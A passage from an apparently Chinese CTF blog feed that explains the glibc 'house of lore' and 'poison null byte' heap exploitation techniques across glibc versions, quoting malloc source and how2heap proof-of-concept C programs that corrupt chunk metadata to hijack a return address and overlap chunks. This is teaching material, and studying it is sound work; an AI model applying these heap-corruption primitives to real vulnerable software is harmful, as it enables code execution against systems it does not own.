class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br><span class="hljs-comment">//取bin中最后一个chunk，由bin-&gt;bk决定</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              set_inuse_bit_at_offset (victim, nb);<br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><span class="hljs-comment">//取下victim后bin-&gt;bk由victim-&gt;bk决定</span><br><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-26以前"><a href="#2-26以前" class="headerlink" title="2.26以前"></a>2.26以前</h2><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br> size in order to have the absolute address of the chunk<br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>为绕过检查布局，实现效果为malloc到buffer1<img src="/2023/02/05/house-of-lore/1-1.jpg" class title="步骤一"></li><li>victim进入small bin<img src="/2023/02/05/house-of-lore/1-2.jpg" class title="步骤二"></li><li>victim-&gt;bk&#x3D;buffer1，将buffer1链入small bin<img src="/2023/02/05/house-of-lore/1-3.jpg" class title="步骤三"></li><li>malloc回victim，buffer1-&gt;fd&#x3D;victim绕过bck-&gt;fd&#x3D;&#x3D;victim的检查<img src="/2023/02/05/house-of-lore/1-4.jpg" class title="步骤四"></li><li>malloc回buffer1，buffer1-&gt;bk&#x3D;buffer2和buffer2-&gt;fd&#x3D;buffer1绕过bck-&gt;fd&#x3D;&#x3D;victim的检查</li><li>之后我们就能控制函数的返回地址了</li></ul><h2 id="2-26以后"><a href="#2-26以后" class="headerlink" title="2.26以后"></a>2.26以后</h2><p>2.26加入tcache机制之后，从small bin中取出一个chunk后会把small bin中剩下的chunk装入tcache直到装满，放入过程没有任何检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br><br>      tcache_put (tc_victim, tc_idx);<br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">void</span>* fake_freelist[<span class="hljs-number">7</span>][<span class="hljs-number">4</span>];<br><br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-type">void</span> *dummies[<span class="hljs-number">7</span>];<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) dummies[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++) &#123;<br>    fake_freelist[i][<span class="hljs-number">3</span>] = fake_freelist[i+<span class="hljs-number">1</span>];<br>  &#125;<br>  fake_freelist[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//伪造从small bin中取出chunk后填满tcache的chunk</span><br><br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br><span class="hljs-comment">//可以少一步伪造buffer2的fd</span><br><br>  stack_buffer_2[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span> *)fake_freelist[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(dummies[i]);<br><span class="hljs-comment">//填满tcache</span><br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><span class="hljs-comment">//victim进入unsorted bin</span><br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><span class="hljs-comment">//victim进入small bin</span><br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <br><span class="hljs-comment">//fake6&lt;-fake5&lt;-……&lt;-fake1&lt;-fake0&lt;-buffer2&lt;-buffer1&lt;-victim</span><br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//清空tcache</span><br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//malloc到victim，buffer1、buffer2和fake0——fake4进入tcache</span><br><br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//从tcache中取出buffer1</span><br><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>就多了伪造填满tcache的chunk的步骤</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>poison null byte</title>
    <link href="/2023/02/04/poison-null-byte/"/>
    <url>/2023/02/04/poison-null-byte/</url>
    
    <content type="html"><![CDATA[<p>之前学的时候有点云里雾里，画了一遍图觉得清楚多了（果然美术生就要画图(*σ´∀&#96;)σ）（例题做的真坐牢QAQ）</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>如果对输入长度检查不严，导致chunk中内容输入多了一个零字节溢出至next chunk的size最低位，改变next chunk的size的大小<br>主要作用就是改变next chunk的preinuse位触发合并和造成堆块错位</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-26以前"><a href="#2-26以前" class="headerlink" title="2.26以前"></a>2.26以前</h2><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* c;<br><span class="hljs-type">uint8_t</span>* b1;<br><span class="hljs-type">uint8_t</span>* b2;<br><span class="hljs-type">uint8_t</span>* d;<br><span class="hljs-type">void</span> *barrier;<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br>*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><span class="hljs-built_in">free</span>(b);<br><br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><br><span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">free</span>(b1);<br><span class="hljs-built_in">free</span>(c);<br><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br>assert(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>示意图如下：</p><ul><li>以下步骤是为了控制b的size，为之后c向下合并做准备<img src="/2023/02/04/poison-null-byte/1.jpg" class title="步骤一"></li><li>分割b是为了产生b1伪造一个在unsorted bin中的pre chunk，防止unlink报错。触发c的向下合并，再malloc回来c后我们就能完全控制b2<img src="/2023/02/04/poison-null-byte/2.jpg" class title="步骤二">ps：像是形成一个三明治结构（二三层间得有个缝），然后控制中间的chunk<br>pps：申请大小要大于fastbin的范围</li></ul><h2 id="2-26-2-28"><a href="#2-26-2-28" class="headerlink" title="2.26-2.28"></a>2.26-2.28</h2><p>有tcache后注意两点：</p><ul><li>申请大小要大于tcache的范围</li><li>heap最开始会划分一个0x290的chunk给tcache，因此要先申请一个pad chunk使起始地址0x100对齐</li></ul><h2 id="2-28以后"><a href="#2-28以后" class="headerlink" title="2.28以后"></a>2.28以后</h2><p>2.29增加了很多检查：</p><ul><li>_int_malloc函数的for(;;)循环中unsorted bin遍历开头增加next chunk的大小合法性检查，在b2 &#x3D; malloc(0x80)时会报错（这个可以绕过）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure></li><li>_int_free向下合并时增加pre chunk的size和presize的检查，在触发c的向下合并时会报错<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br> malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></td></tr></table></figure>因此有了另一种更加复杂的利用方法，实验代码如下（来自how2heap）：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">void</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><span class="hljs-type">void</span> *heap_base = (<span class="hljs-type">void</span> *)((<span class="hljs-type">long</span>)tmp &amp; (~<span class="hljs-number">0xfff</span>));<br><br><span class="hljs-type">size_t</span> size = <span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - <span class="hljs-number">0x20</span>;<br><span class="hljs-type">void</span> *padding= <span class="hljs-built_in">malloc</span>(size);<br><span class="hljs-comment">//布置prev地址对齐0x1000 </span><br><br><span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-type">void</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(prev);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><br><span class="hljs-type">void</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><br>assert(prev == prev2);<br><br>((<span class="hljs-type">long</span> *)prev)[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;<br>*(<span class="hljs-type">long</span> *)(prev + <span class="hljs-number">0x500</span>) = <span class="hljs-number">0x500</span>;<br><br><span class="hljs-type">void</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;  <span class="hljs-comment">// b-&gt;fd &lt;- fake_chunk</span><br><br><span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">free</span>(a2);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-type">void</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><br><span class="hljs-type">void</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>((<span class="hljs-type">char</span> *)victim2)[<span class="hljs-number">-8</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-comment">/* VULNERABILITY */</span><br><br><span class="hljs-type">void</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">memset</span>(merged, <span class="hljs-string">&#x27;A&#x27;</span>, <span 